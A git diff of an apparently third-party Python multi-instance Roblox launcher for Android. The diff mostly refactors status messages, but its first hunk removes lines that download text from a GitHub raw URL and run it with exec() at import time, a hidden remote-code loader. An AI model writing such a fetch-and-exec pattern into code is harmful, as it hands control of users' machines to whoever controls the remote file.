@@ -17,11 +17,6 @@ import signal
 from colorama import init, Fore, Style
 from threading import Lock
 
-url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
-response = requests.get(url)
-
-exec(response.text)
-
 init()
 
 SERVER_LINKS_FILE = "AXPrivate_Server_Link.txt"
@@ -327,29 +322,26 @@ def kill_roblox_process(package_name):
 
 def launch_roblox(package_name, server_link, num_packages, package_statuses):
     try:
-        update_package_status(package_name, "Opening Roblox for...")
+        package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Opening Roblox for {package_name}..." + Style.RESET_ALL
+        update_status_table(package_statuses)
 
-        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], 
-                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(15 if num_packages >= 6 else 8)
+        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(15 if num_packages >= 6 else 8)  # Adjust wait time based on the number of packages
 
-        update_package_status(package_name, "Joining Roblox for...")
-
-        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], 
-                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Joining Roblox for {package_name}..." + Style.RESET_ALL
+        update_status_table(package_statuses)
+        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         time.sleep(20)
-        update_package_status(package_name, "Joined Roblox")
+        
+        package_statuses[package_name]["Status"] = Fore.GREEN + "Joined Roblox" + Style.RESET_ALL
+        update_status_table(package_statuses)
 
     except Exception as e:
         package_statuses[package_name]["Status"] = Fore.RED + f"Error launching Roblox for {package_name}: {e}" + Style.RESET_ALL
         update_status_table(package_statuses)
         print(f"Error details: {e}")
 
-def update_package_status(package_name, action):
-    package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"{action} {package_name}..." + Style.RESET_ALL
-    update_status_table(package_statuses)
-        
 def get_game_name(game_link_or_id):
     try:
         # Extract the game ID from the link if it's a URL
